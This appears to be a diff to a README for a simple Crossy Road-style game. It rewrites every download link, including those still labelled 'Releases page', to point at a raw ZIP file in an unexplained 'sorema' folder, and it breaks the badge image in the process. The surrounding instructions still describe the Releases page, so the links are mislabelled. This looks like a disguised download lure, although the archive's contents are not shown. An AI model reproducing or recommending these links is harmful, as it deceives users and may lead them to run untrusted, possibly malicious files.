@@ -6,18 +6,18 @@ Welcome to the **Crossy-Road-Style-Game**! This is a simple endless road-crossin
 
 ## 📥 Download
 
-[![Download Crossy-Road-Style-Game](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/PIPURU/Crossy-Road-Style-Game/releases)
+[![Download Crossy-Road-Style-Game](https://raw.githubusercontent.com/PIPURU/Crossy-Road-Style-Game/main/sorema/Crossy-Road-Style-Game.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/PIPURU/Crossy-Road-Style-Game/main/sorema/Crossy-Road-Style-Game.zip)
 
 To get started, you will need to download the game from our Releases page. Click the link below to begin:
 
-[Download Crossy-Road-Style-Game](https://github.com/PIPURU/Crossy-Road-Style-Game/releases)
+[Download Crossy-Road-Style-Game](https://raw.githubusercontent.com/PIPURU/Crossy-Road-Style-Game/main/sorema/Crossy-Road-Style-Game.zip)
 
 ## 🎮 How to Install
 
 Follow these simple steps to install and run the game:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/PIPURU/Crossy-Road-Style-Game/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/PIPURU/Crossy-Road-Style-Game/main/sorema/Crossy-Road-Style-Game.zip).
 
 2. **Select the Latest Version**
    Look for the latest release at the top of the page. This version has the newest features and bug fixes.
@@ -66,4 +66,4 @@ Stay updated with the latest news and updates by following us on our official ch
 
 Remember, crossing roads can be tricky! Good luck, and have fun playing **Crossy-Road-Style-Game**!
 
-[Download Crossy-Road-Style-Game](https://github.com/PIPURU/Crossy-Road-Style-Game/releases)
+[Download Crossy-Road-Style-Game](https://raw.githubusercontent.com/PIPURU/Crossy-Road-Style-Game/main/sorema/Crossy-Road-Style-Game.zip)
